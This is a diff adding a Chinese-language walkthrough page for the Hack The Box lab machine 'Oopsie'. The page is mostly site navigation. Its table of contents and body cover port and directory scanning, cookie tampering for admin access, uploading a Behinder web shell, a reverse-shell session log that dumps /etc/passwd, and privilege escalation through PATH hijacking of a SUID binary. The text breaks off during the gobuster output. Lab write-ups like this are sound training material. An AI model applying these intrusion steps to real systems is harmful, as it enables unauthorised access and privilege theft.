+  <span class="md-ellipsis">
+    
+  
+    PortSwigger Academy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    PortSwigger Academy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../PortSwigger-Academy/File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File upload vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Php
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Php
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../php/serialize_unserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Serialize unserialize
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pwn
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Pwn
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_format0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar format0
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_format1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar format1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_format2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar format2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_heap0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar heap0
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_heap1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar heap1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_heap2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar heap2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_heap3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar heap3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_stack0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar_stack0
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_stack1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar_stack1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_stack2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar_stack2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_stack3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar_stack3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_stack4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar_stack4
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_stack5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar stack5
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_stack6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar stack6
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/Protostar_stack7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Protostar stack7
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/bamboofox-ret2syscall-rop/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    bamboofox-ret2syscall-rop
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwn-sniper-01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwn-sniper-01
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwn-sniper-02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwn-sniper-02
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwn-sniper-03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwn-sniper-03
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwnable--bof/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwnable--bof
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwnable--collision/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwnable--collision
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwnable--fd%20--%20%28File%20descriptor%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwnable--fd -- (File descriptor)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwnable--flag--%28reverse%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwnable--flag--(reverse)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwnable--input/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwnable--input
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwnable--passcode/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwnable--passcode
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/pwnable--random/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    pwnable--random
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/ret2shellcode/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ret2shellcode
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/stack_test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    stack_test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../pwn/xctf--pwn--%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    xctf--pwn--反应釜开关控制
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ATTCK红队评估01
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ATTCK红队评估02
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/HTB%20Pilgrimage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB Pilgrimage
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/tryhackme%20-%20Overpass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    tryhackme - Overpass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/vulhub%20%20%20%20DC-9/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    vulhub    DC-9
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/vulhub%20%20%20%20DIGITALWORLD.LOCAL_%20BRAVERY/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    vulhub    DIGITALWORLD.LOCAL: BRAVERY
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        扫描端口
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        访问web目录
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="访问web目录">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#login" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        查看源码，搜索login关键字得到：
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        访问得到登陆界面
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#login-as-guestaccount" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        尝试爆破密码未成功，点击[Login as Guest],进入后台，并点击Account
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookiefuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        拦截流量并对cookie中的参数进行fuzz
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34322-admin-2233-guest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        测试出34322 / admin 以及 2233 / guest这两个账户
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuzzadmin-cookieuploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        用fuzz得到的admin cookie去访问Uploads页面
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcookie34322-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        然后上传冰蝎shell（上传时也需要注意修改cookie为34322 / admin）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellfuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        上传成功，但是不知道shell所在目录，所以需要fuzz出目录
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        连接shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ncshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        本地开启nc监听，获取稳定shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellshellbinbash-script-q-devnull" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        切换为交互式shell：SHELL=/bin/bash script -q /dev/null
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kalikali-nc-vnlp-5678-listening-on-any-5678-connect-to-10101490-from-unknown-1012928222-47640-linux-oopsie-4150-76-generic-86-ubuntu-smp-fri-jan-17-172428-utc-2020-x86_64-x86_64-x86_64-gnulinux-084631-up-123-0-users-load-average-000-000-000-user-tty-from-login-idle-jcpu-pcpu-what-uid33www-data-gid33www-data-groups33www-data-binsh-0-cant-access-tty-job-control-turned-off-pwd-whoami-www-data-ls-bin-boot-cdrom-dev-etc-home-initrdimg-initrdimgold-lib-lib64-lostfound-media-mnt-opt-proc-root-run-sbin-snap-srv-sys-tmp-usr-var-vmlinuz-vmlinuzold-shellbinbash-script-q-devnull-www-dataoopsie-whoami-whoami-www-data-www-dataoopsievarwwwhtml-cat-etcpasswd-cat-etcpasswd-rootx00rootrootbinbash-daemonx11daemonusrsbinusrsbinnologin-binx22binbinusrsbinnologin-sysx33sysdevusrsbinnologin-syncx465534syncbinbinsync-gamesx560gamesusrgamesusrsbinnologin-manx612manvarcachemanusrsbinnologin-lpx77lpvarspoollpdusrsbinnologin-mailx88mailvarmailusrsbinnologin-newsx99newsvarspoolnewsusrsbinnologin-uucpx1010uucpvarspooluucpusrsbinnologin-proxyx1313proxybinusrsbinnologin-www-datax3333www-datavarwwwusrsbinnologin-backupx3434backupvarbackupsusrsbinnologin-listx3838mailing-list-managervarlistusrsbinnologin-ircx3939ircdvarrunircdusrsbinnologin-gnatsx4141gnats-bug-reporting-system-adminvarlibgnatsusrsbinnologin-nobodyx6553465534nobodynonexistentusrsbinnologin-systemd-networkx100102systemd-network-managementrunsystemdnetifusrsbinnologin-systemd-resolvex101103systemd-resolverrunsystemdresolveusrsbinnologin-syslogx102106homesyslogusrsbinnologin-messagebusx103107nonexistentusrsbinnologin-_aptx10465534nonexistentusrsbinnologin-lxdx10565534varliblxdbinfalse-uuiddx106110runuuiddusrsbinnologin-dnsmasqx10765534dnsmasqvarlibmiscusrsbinnologin-landscapex108112varliblandscapeusrsbinnologin-pollinatex1091varcachepollinatebinfalse-sshdx11065534runsshdusrsbinnologin-robertx10001000roberthomerobertbinbash-mysqlx111114mysql-servernonexistentbinfalse-www-dataoopsievarwwwhtml" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ┌──(kali㉿kali)-[~] └─$ nc -vnlp 5678 listening on [any] 5678 ... connect to [10.10.14.90] from (UNKNOWN) [10.129.28.222] 47640 Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 08:46:31 up 1:23, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can&#39;t access tty; job control turned off $ pwd / $ whoami www-data $ ls bin boot cdrom dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var vmlinuz vmlinuz.old $ SHELL=/bin/bash script -q /dev/null www-data@oopsie:/$ whoami whoami www-data www-data@oopsie:/var/www/html$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin robert:x:1000:1000:robert:/home/robert:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false www-data@oopsie:/var/www/html$
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        提权
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="提权">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#webdbphp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        进入web目录下，查看db.php，获取到数据库连接信息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#robert" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        登陆robert账户，并查看相关权限
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#robertbugtrackerbugtracker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        发现robert用户属于bugtracker组，查找bugtracker
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tmpcat-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        进入/tmp目录（因为可写），然后创建名为cat的文件（实际内容是启动一个 Shell），内容如下：
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tmpcat-path-export-pathtmppath-cat-tmp-bin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        赋予/tmp/cat执行权限，然后劫持 PATH 环境变量：export PATH=/tmp:$PATH(告诉系统：当有人运行 cat 时，先去 /tmp 找，而不是去系统的 /bin 找)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#usrbinbugtracker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        然后再次执行/usr/bin/bugtracker触发提权
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Oopsie</h1>
+
+<h2 id="_1"><img alt="image.png|1353" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320154705809.png" /></h2>
+<h2 id="_2">扫描端口</h2>
+<div class="highlight"><pre><span></span><code>└─$ sudo  nmap -sS -Pn  -T4 -O 10.129.28.222
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-20 03:58 EDT
+Nmap scan report for 10.129.28.222
+Host is up (0.35s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.07 seconds
+</code></pre></div>
+<h2 id="web">访问web目录</h2>
+<p><img alt="image.png|955" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320160123532.png" /></p>
+<h3 id="login">查看源码，搜索login关键字得到：</h3>
+<p><code>&lt;script src="[/cdn-cgi/login/script.js](view-source:http://10.129.28.222/cdn-cgi/login/script.js)"&gt;&lt;/script&gt;</code></p>
+<h3 id="_3">访问得到登陆界面</h3>
+<p><img alt="image.png|996" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320160200369.png" /></p>
+<h3 id="login-as-guestaccount">尝试爆破密码未成功，点击<code>[Login as Guest]</code>,进入后台，并点击Account</h3>
+<h3 id="cookiefuzz">拦截流量并对cookie中的参数进行fuzz</h3>
+<p><img alt="image.png|1253" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320160643942.png" />
+<img alt="image.png|1274" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320160754542.png" /></p>
+<h3 id="34322-admin-2233-guest">测试出34322 / admin 以及 2233 / guest这两个账户</h3>
+<p><img alt="image.png|1401" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320161840320.png" /></p>
+<h3 id="fuzzadmin-cookieuploads">用fuzz得到的admin cookie去访问Uploads页面</h3>
+<p><img alt="image.png" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320162057208.png" /></p>
+<h3 id="shellcookie34322-admin">然后上传冰蝎shell（上传时也需要注意修改cookie为34322 / admin）</h3>
+<p><img alt="image.png" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260320162526183.png" /></p>
+<h3 id="shellfuzz">上传成功，但是不知道shell所在目录，所以需要fuzz出目录</h3>
+<div class="highlight"><pre><span></span><code>└─$<span class="w"> </span>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.129.28.222<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<span class="w"> </span>-x<span class="w"> </span><span class="nv">php</span>
+<span class="o">===============================================================</span>
+Gobuster<span class="w"> </span>v3.6
+by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">                     </span>http://10.129.28.222
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">                  </span>GET
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">                 </span><span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">                </span>/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Negative<span class="w"> </span>Status<span class="w"> </span>codes:<span class="w">   </span><span class="m">404</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">              </span>gobuster/3.6
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Extensions:<span class="w">              </span>php
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">                 </span><span class="nv">10s</span>
+<span class="o">===============================================================</span>
